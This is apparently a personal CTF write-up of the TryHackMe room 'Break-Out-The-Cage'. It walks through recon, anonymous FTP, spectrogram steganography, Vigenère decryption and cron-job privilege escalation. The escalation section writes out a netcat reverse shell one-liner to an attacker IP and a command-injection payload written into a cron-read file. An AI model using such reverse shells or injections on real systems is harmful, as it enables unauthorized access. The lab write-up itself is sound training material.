---
layout: post
title: "TryHackMe — Break-Out-The-Cage"
date: 2026-05-13
category: writeup
platform: TryHackMe
difficulty: Medium
tags:
  - FTP
  - Steganography
  - Cryptography
  - Python
  - Cron Abuse
  - Privilege Escalation
excerpt: "A Nicolas Cage themed room involving anonymous FTP, audio steganography, Vigenère decryption, and cron job abuse."
---

## Overview

Cage is a Nicolas Cage themed room that chains together several distinct techniques: anonymous FTP access, base64 encoding, audio steganography, Vigenère cipher decryption, and cron job abuse. No single step is particularly complex — but connecting them requires lateral thinking.

**Attack chain:**
```
Recon → FTP (anonymous) → Base64 decode → Spectrogram analysis
→ Vigenère decrypt → Shell as weston → Cron abuse → Shell as cage
→ Vigenère decrypt (again) → su root → Root mail flag
```

---

## 1. Recon

Started with an nmap scan to identify open services:

```bash
nmap -sV -sC <TARGET_IP>
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-13 19:48 +0200
Nmap scan report for 10.48.136.40
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:<YOUR_IP>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.47 seconds

```

Notable ports:
- **21** — FTP (anonymous login enabled)
- **22** — SSH
- **80** — HTTP (Apache)

Then ran ffuf to enumerate web directories:

```bash
ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://<TARGET_IP>/FUZZ -mc 301,302,403 -t 64

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET_IP>/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 64
 :: Matcher          : Response status: 301,302,403
________________________________________________

images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 169ms]
html                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 171ms]
scripts                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 170ms]
contracts               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 169ms]
auditions               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 169ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 168ms]
:: Progress: [207643/207643] :: Job [1/1] :: 256 req/sec :: Duration: [0:09:21] :: Errors: 0 ::

```

Found an `/auditions` directory containing an MP3 file.

---

## 2. FTP — Anonymous Login

```bash
FTP <TARGET_IP>
Connected to <TARGET_IP>.
220 (vsFTPd 3.0.3)
Name (...): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||52476|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> help
...
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
...
226 Transfer complete.
396 bytes received in 00:00 (1.21 KiB/s)
ftp> bye
221 Goodbye.
               
```

Retrieved a file containing base64 encoded text. Decoded it:

```bash
base64 -d dad_tasks.txt > dad_tasks_decoded
```

The output was Vigenère ciphertext — not yet readable without a key.

![Deciphered text of dad_tasks file](/assets/images/writeups/break-out-the-cage/Decoded.png)

---

## 3. Audio Steganography — Finding the Key

Downloaded the MP3 from `/auditions`:

```bash
wget http://<TARGET_IP>/auditions/must_practice_corrupt_file.mp3
```

Opened it in Audacity and switched the track to **Spectrogram view** (click the track dropdown → Spectrogram). Zoomed into the high frequency range (~2000–8000 Hz) to reveal text hidden in the audio frequencies:

![Spectrogram showing the key](/assets/images/writeups/break-out-the-cage/Audacity.png)

**Key found: `namelesstwo`**

This is a classic steganography technique — data encoded visually into the frequency spectrum of an audio file, invisible to the human ear but visible as shapes when rendered as a spectrogram.

---

## 4. Vigenère Decryption — Round 1

With the key `namelesstwo`, decrypted the ciphertext from the FTP file using [dcode.fr/vigenere-cipher](https://www.dcode.fr/vigenere-cipher).

This revealed the deciphered data, where westons password resides.

```bash
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... (Weston's Password resides here)
```
Used it to SSH in as **weston**.

```bash
ssh weston@<TARGET_IP>
...
weston@10.48.136.40's password: (Enter westons password we discovered here)
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
...
         __________
        /\____;;___\
       | /         /
       `. ())oo() .
        |\(%()*^^()^\
       %| |-%-------|
      % \ | %  ))   |
      %  \|%________|
       %%%%
Last login: Tue May 26 10:58:20 2020 from 192.168.247.1
...                                                                    
“Killing me won’t bring back your Super_Duper_Checklist email_backup Super_Duper_Checklist email_backup honey!” — The Wicker Man
..
weston@national-treasure:~$ whoami
weston
weston@national-treasure:~$ 

```

---

## 5. Privilege Escalation — weston → cage

Enumerated group membership:

```bash
id
# uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
```


Refering back to the book "Linux Basics for Hackers by OccupyTheWeb". The group leader is always associated with the '1000' uid — Spectating the user id, we discover weston is apart of the `cage` group.  

Now utilising the pspy64s payload will allow us to monitor running processes without root privileges. It lets you spy on what commands other users (including root) are executing.

After downloading the payload, follow this to upload it to the target machine and grant executing permissions:

```bash
# Attackers (ME) Terminal:
python3 -m http.server

# Target (weston) terminal
wget http://<Your IP>:8000/pspy64s -O /tmp/pspy64s
chmod +x /tmp/pspy64s
```
Now on the previous VM I completed, I had issues granting executing permissions to the pspy payload, due to my remote system not having write permissions. To bypass this issue — /tmp is world-writable, therefore downloading the payload to the /tmp directory completely disregards such uneccesary headache.     

![Executing the pspy64s Payload](/assets/images/writeups/break-out-the-cage/PSPY64S.png)

Viewing the processes, you'll come across
```
/opt/.dads_scripts/.files/.quotes
```

This file is read by `/opt/.dads_scripts/spread_the_quotes.py`, which runs as `cage` via a cron job every minute:

```python
lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)   # <-- unsanitized input passed to shell
```

The `os.system()` call executes whatever is in the quotes file as a shell command. Created a reverse shell script and injected it:

```bash
# Create the reverse shell
cat << EOF > /tmp/rev
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 4444 >/tmp/f
EOF
chmod +x /tmp/rev

# Inject into quotes file
printf 'revshell time; /tmp/rev\n' > /opt/.dads_scripts/.files/.quotes
```

Started a listener on Kali:

```bash
# Attackers (ME) Terminal:
nc -lvnp 4444
```

Within a minute the cron job fired and a shell dropped as **cage**.

```bash
# Target Terminal
revshell time

# Attacker Terminal
# Upgrade you shell to a proper tty first
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
cage@national-treasure:~$ whoami
whoami
cage
cage@national-treasure:~$ 

```

Listing the current working directory, we can see 2 available directories for us to access. Viewing the "Super_Duper_Checklist" directory, we can see one of the remaining flags.   

```bash
cage@national-treasure:~$ ls
ls
email_backup  Super_Duper_Checklist
cage@national-treasure:~$ cat Super_Duper_Checklist
cat Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: (Flag resides here)
```

---

## 6. Privilege Escalation — cage → root

Entering cage's "email_backup" directory, we see 3 emails:

```bash
cat email_3
```

The email mentioned a colleague named Sean (username: `root`) who left a note:

```
haiinspsyanileph
```

The email heavily hinted at the key — the word **"face"** was emphasised repeatedly.

Decrypted using Vigenère with key `face` → revealed root's password.



```bash
su root
# enter decrypted password
```

---

## 7. Root Flag

The flag wasn't in `/root/root.txt` — it was in root's mail:

```bash
cat /root/email_backup/email_1 OR email_2
```

---

## Key Takeaways

| Technique | Lesson |
|---|---|
| Anonymous FTP | Always check FTP with anonymous login during recon |
| Audio steganography | Spectrogram view in Audacity reveals hidden visual data |
| Vigenère cipher | Classic symmetric cipher — hints about the key are often in the surrounding context |
| `os.system()` with unsanitised input | Any script that passes user-controlled data to a shell function is exploitable |
| Cron job abuse | If you can write to a file executed by cron, you control that user's shell |

---

## Tools Used

- nmap
- ffuf
- Audacity (spectrogram view)
- dcode.fr (Vigenère decryption)
- netcat
- Python pty

---

*Room completed on TryHackMe. Write-up by [Wandipa Marema] — [2026-05-13]*
